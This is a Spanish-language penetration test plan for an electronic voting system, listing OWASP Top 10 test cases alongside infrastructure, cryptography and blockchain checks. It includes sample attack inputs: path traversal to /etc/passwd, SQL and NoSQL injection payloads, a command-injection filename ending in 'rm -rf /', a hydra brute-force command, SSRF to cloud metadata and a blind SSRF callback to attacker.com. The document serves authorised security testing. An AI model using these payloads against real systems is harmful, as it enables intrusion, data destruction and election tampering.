# Plan de Pruebas de Penetración

## Sistema de Votación Electrónico Seguro

**Versión**: 1.0  
**Fecha**: 2024-01-15  
**Auditor**: [Firma de Seguridad Externa]

---

## 1. Alcance del Test

### 1.1 Objetivos

- Identificar vulnerabilidades críticas antes del lanzamiento
- Validar controles de seguridad implementados
- Cumplir con requisitos de auditoría
- Proteger integridad del proceso electoral

### 1.2 Sistemas en Alcance

- ✅ Backend API (Node.js/Express)
- ✅ Frontend Web Application (React)
- ✅ Crypto Service (Threshold/ZKP)
- ✅ Base de datos PostgreSQL
- ✅ Redis (Session store)
- ✅ Infraestructura (Railway)

### 1.3 Fuera de Alcance

- ❌ Ataques físicos a infraestructura
- ❌ Social engineering contra usuarios
- ❌ Ataques DDoS a gran escala (pruebas limitadas)

---

## 2. Metodología

### 2.1 Marco de Trabajo

**OWASP Testing Guide v4**
**PTES (Penetration Testing Execution Standard)**

### 2.2 Fases

1. **Reconocimiento** (Passive & Active)
2. **Escaneo** (Vulnerability scanning)
3. **Enumeración** (Service enumeration)
4. **Explotación** (Controlled exploitation)
5. **Post-Explotación** (Privilege escalation, lateral movement)
6. **Reporte** (Findings and recommendations)

---

## 3. Tests OWASP Top 10 (2023)

### 3.1 A01:2023 - Broken Access Control

#### Tests a Realizar:

- [ ] **Path Traversal**
  ```bash
  curl https://api.voting-system.com/api/../../../../etc/passwd
  ```

- [ ] **IDOR (Insecure Direct Object Reference)**
  ```bash
  # Try to access another user's data
  GET /api/user/{other_user_id}/data
  ```

- [ ] **Missing Authorization**
  ```bash
  # Access admin endpoint without admin role
  GET /api/admin/elections
  ```

- [ ] **Privilege Escalation**
  - Attempt to modify user role in JWT
  - Test multi-sig approval bypass

**Criterios de Éxito**: ✅ Todos los accesos no autorizados deben ser bloqueados

---

### 3.2 A02:2023 - Cryptographic Failures

#### Tests a Realizar:

- [ ] **Weak Encryption**
  - Verify TLS 1.3 is enforced
  - Check cipher suites
  ```bash
  nmap --script ssl-enum-ciphers -p 443 voting-system.com
  ```

- [ ] **Insecure Storage**
  - Verify passwords are hashed with bcrypt
  - Check for plaintext secrets in environment

- [ ] **Insufficient Entropy**
  - Analyze JWT secrets
  - Check nonce generation for votes

- [ ] **Threshold Cryptography**
  - Test key recovery with < threshold shares
  - Verify ZKP receipt non-coercibility

**Criterios de Éxito**: ✅ Solo algoritmos seguros (AES-256, RSA-4096, bcrypt)

---

### 3.3 A03:2023 - Injection

#### Tests a Realizar:

- [ ] **SQL Injection**
  ```sql
  -- Login bypass
  email: admin@voting.com' OR '1'='1' --
  password: anything

  -- Union-based injection
  GET /api/elections?id=1 UNION SELECT * FROM users
  ```

- [ ] **NoSQL Injection** (Redis)
  ```javascript
  {"email": {"$ne": null}, "password": {"$ne": null}}
  ```

- [ ] **Command Injection**
  ```bash
  POST /api/backup
  {"filename": "backup.tar.gz; rm -rf /"}
  ```

- [ ] **LDAP Injection** (if applicable)

**Criterios de Éxito**: ✅ Prepared statements, input sanitization

---

### 3.4 A04:2023 - Insecure Design

#### Tests a Realizar:

- [ ] **Business Logic Flaws**
  - Vote multiple times in same election
  - Manipulate election timeline
  - Bypass eligibility checks

- [ ] **Race Conditions**
  ```bash
  # Parallel vote submissions
  for i in {1..100}; do
    curl -X POST /api/vote/cast & 
  done
  ```

- [ ] **Cryptographic Design**
  - Test threshold cryptography bypass
  - Attempt to link vote to voter
  - ZKP verification weaknesses

**Criterios de Éxito**: ✅ Robust business logic, no race conditions

---

### 3.5 A05:2023 - Security Misconfiguration

#### Tests a Realizar:

- [ ] **Default Credentials**
  ```bash
  # Test common defaults
  admin:admin
  root:toor
  ```

- [ ] **Directory Listing**
  ```bash
  curl https://api.voting-system.com/.git/
  curl https://voting-system.com/backup/
  ```

- [ ] **Verbose Error Messages**
  ```bash
  POST /api/auth/login
  {"email": "test", "password": "test"}
  # Should NOT reveal: "User not found" vs "Invalid password"
  ```

- [ ] **Missing Security Headers**
  ```bash
  curl -I https://voting-system.com
  # Check for: X-Frame-Options, CSP, HSTS, etc.
  ```

- [ ] **CORS Misconfiguration**
  ```bash
  curl -H "Origin: https://evil.com" https://api.voting-system.com
  ```

**Criterios de Éxito**: ✅ Hardened configuration, no defaults

---

### 3.6 A06:2023 - Vulnerable and Outdated Components

#### Tests a Realizar:

- [ ] **Dependency Scanning**
  ```bash
  npm audit
  snyk test
  ```

- [ ] **Known CVEs**
  ```bash
  # Check Node.js, PostgreSQL, Redis versions
  docker exec backend node --version
  docker exec postgres psql --version
  ```

- [ ] **Unmaintained Libraries**
  - Review package.json for last updated dates

**Criterios de Éxito**: ✅ All dependencies up-to-date, no high/critical CVEs

---

### 3.7 A07:2023 - Identification and Authentication Failures

#### Tests a Realizar:

- [ ] **Brute Force**
  ```bash
  hydra -l admin@voting.com -P passwords.txt https-post-form "/api/auth/login:email=^USER^&password=^PASS^:F=Invalid"
  ```

- [ ] **Weak Password Policy**
  - Test: password, 123456, qwerty

- [ ] **Session Management**
  - Session fixation
  - Session hijacking
  - Logout doesn't invalidate session

- [ ] **2FA Bypass**
  - Direct API call skipping 2FA
  - TOTP code brute force
  - Backup code enumeration

- [ ] **JWT Attacks**
  - `alg: none` attack
  - `RS256` to `HS256` confusion
  - Token expiration not enforced

**Criterios de Éxito**: ✅ Strong auth, rate limiting, secure sessions

---

### 3.8 A08:2023 - Software and Data Integrity Failures

#### Tests a Realizar:

- [ ] **Unsigned Code**
  - Verify SRI (Subresource Integrity) on frontend
  ```html
  <script src="app.js" integrity="sha384-..." />
  ```

- [ ] **Insecure Deserialization**
  ```javascript
  // Malicious JWT payload
  {"userId": "admin", "__proto__": {"isAdmin": true}}
  ```

- [ ] **Supply Chain**
  - Check for malicious npm packages
  - Verify Docker image integrity

- [ ] **Blockchain Integrity**
  - Attempt to modify past blocks
  - Test Merkle tree verification

**Criterios de Éxito**: ✅ SRI, signed artifacts, blockchain immutability

---

### 3.9 A09:2023 - Security Logging and Monitoring Failures

#### Tests a Realizar:

- [ ] **Insufficient Logging**
  - Perform malicious actions
  - Verify they appear in SIEM

- [ ] **Log Injection**
  ```bash
  POST /api/auth/login
  {"email": "test\n[ADMIN] Login successful", "password": "test"}
  ```

- [ ] **Log Tampering**
  - Attempt to delete/modify audit logs

- [ ] **Alerting**
  - Trigger security events
  - Verify alerts are sent

**Criterios de Éxito**: ✅ Comprehensive logging, tamper-proof, real-time alerts

---

### 3.10 A10:2023 - Server-Side Request Forgery (SSRF)

#### Tests a Realizar:

- [ ] **SSRF to Internal Services**
  ```bash
  POST /api/import-data
  {"url": "http://localhost:5432"} # Try to access PostgreSQL

  {"url": "http://169.254.169.254/latest/meta-data"} # AWS metadata
  ```

- [ ] **Blind SSRF**
  ```bash
  {"url": "http://attacker.com/callback"}
  # Monitor attacker.com for incoming request
  ```

**Criterios de Éxito**: ✅ URL validation, whitelist only, no internal access

---

## 4. Tests Específicos del Sistema

### 4.1 Voting System Specific

- [ ] **Double Voting**
  - Attempt to vote twice in same election

- [ ] **Vote Manipulation**
  - Modify encrypted vote before submission
  - Replay vote transaction

- [ ] **Eligibility Bypass**
  - Vote in election without eligibility

- [ ] **Result Manipulation**
  - Attempt to decrypt votes before election end
  - Modify vote counts

### 4.2 Blockchain Specific

- [ ] **51% Attack Simulation**
  - Not applicable (permissioned blockchain)

- [ ] **Block Modification**
  - Attempt to alter past blocks
  - Test chain validation

- [ ] **Merkle Tree**
  - Provide invalid proof
  - Test verification

### 4.3 Cryptography Specific

- [ ] **Threshold Cryptography**
  - Recovery with insufficient shares
  - Share corruption

- [ ] **Zero-Knowledge Proofs**
  - Invalid proof acceptance
  - Proof forgery

- [ ] **Multi-Signature**
  - Bypass signature requirements
  - Signature replay

---

## 5. Tests de Infraestructura

### 5.1 Network Security

```bash
# Port scanning
nmap -sV -sC voting-system.com

# Service enumeration
nmap -p- voting-system.com

# TLS/SSL testing
testssl.sh voting-system.com
```

### 5.2 Container Security

```bash
# Docker vulnerability scanning
docker scan voting-backend:latest

# Check for exposed secrets
trufflehog docker://voting-backend
```

### 5.3 Database Security

```bash
# Check for default credentials
psql -h db.voting-system.com -U postgres

# Test encryption at rest
# Verify SSL connection required
```

---

## 6. Timing Attacks

### 6.1 Authentication Timing

```python
import time
import requests

def timing_attack(email):
    start = time.time()
    requests.post('https://api.voting-system.com/auth/login', 
                  json={'email': email, 'password': 'test'})
    return time.time() - start

# Valid users should NOT have different response times
```

### 6.2 Cryptographic Timing

- Test constant-time comparison for ZKP verification
- Test constant-time comparison for password verification

---

## 7. Criterios de Aceptación

| Severidad | Máximo Permitido | Acción Requerida |
|-----------|------------------|------------------|
| Critical | 0 | Bloqueo de lanzamiento |
| High | 0 | Corrección antes de lanzamiento |
| Medium | 5 | Plan de mitigación |
| Low | 10 | Backlog |
| Info | Unlimited | Documentar |

---

## 8. Entregables

1. **Executive Summary** (para stakeholders)
2. **Technical Report** (vulnerabilidades detalladas)
3. **PoC Code** (Proof of Concept para vulnerabilidades)
4. **Remediation Plan** (priorizado por severidad)
5. **Re-test Report** (después de correcciones)

---

## 9. Cronograma

| Fase | Duración | Fecha |
|------|----------|-------|
| Reconocimiento | 1 día | 2024-01-15 |
| Escaneo | 2 días | 2024-01-16-17 |
| Explotación | 5 días | 2024-01-18-22 |
| Post-Explotación | 2 días | 2024-01-23-24 |
| Reporte | 3 días | 2024-01-25-27 |
| Entrega | 1 día | 2024-01-28 |

---

## 10. Contacto

**Lead Pentester**: [Nombre]  
**Email**: pentest@security-firm.com  
**Teléfono**: +34 XXX XXX XXX

---

## Apéndice: Herramientas

- **Burp Suite Professional** - Web app testing
- **Metasploit** - Exploitation framework
- **Nmap** - Network scanning
- **SQLMap** - SQL injection
- **Hydra** - Password brute forcing
- **OWASP ZAP** - Automated vulnerability scanning
- **Postman** - API testing
- **Custom Scripts** - System-specific tests

---

**Documento preparado por**: [Firma de Seguridad]  
**Aprobado por**: [CTO/CISO del Sistema de Votación]  
**Fecha**: 2024-01-15

